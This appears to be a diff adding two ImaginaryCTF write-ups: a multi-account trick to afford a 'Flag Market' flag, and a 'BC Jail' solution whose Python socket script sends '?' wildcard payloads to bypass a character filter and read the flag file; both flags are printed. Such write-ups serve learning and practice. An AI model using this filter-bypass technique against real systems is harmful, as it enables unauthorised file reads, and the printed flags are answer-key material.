@@ -103,3 +103,76 @@ The easiest that we can do here is to send a tar archive of symlink linking `../
 
 <br>
 
+# Flag Market
+
+## Description
+
+Just buy the flag! Be warned, they can be kind of pricy... You might have to work with other people to get the money. Be warned, though ... as soon as someone finally buys the flag, the price goes right back up to max!
+
+## Attachments
+
+`http://puzzler7.imaginaryctf.org:4009`
+
+## Solution
+
+We earn around 10 rooCash from multiple accounts each and bringing down the price of the flag.
+
+When we have enough rooCash, we buy the flag.
+
+## flag
+
+`ictf{purchased_with_blood_sweat_and_t3ars}`
+
+<br>
+
+# BC Jail
+
+## Description
+
+We've had some hard jail challenges(nameless & stackless). Time for some easy jail!
+
+Note: The flag is the name of the flag file + the contents of this file. The flag filename is 22 characters long.
+
+## Attachments
+
+`nc puzzler7.imaginaryctf.org 4008`
+
+## Solution
+
+As we can see in source code there is filtering in the input which allows only `bc?/ ` characters.
+
+Thankfully `?` character can used as alternate character in UNIX systems.
+
+script
+
+```
+import socket
+
+
+def netcat(hostname, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((hostname, port))
+    data = (s.recv(1024)).decode()
+    print(data)
+    data = (s.recv(1024)).decode()
+    print(data)
+
+    payload = b'/b??/?c?? '
+    payload += b'?' * 22
+    s.send(payload + b'\n')
+    data = s.recv(1024)
+    print(data)
+
+    payload = b'/b??/c?? ??????????????????????'
+    s.send(payload + b'\n')
+    s.recv(1024)
+    data = s.recv(1024)
+    print(data)
+
+
+netcat('puzzler7.imaginaryctf.org', 4008)
+```
+
+## flag
+
+`ictf{bre4k1ng_7he_j41l_like_4_b0ss!}`
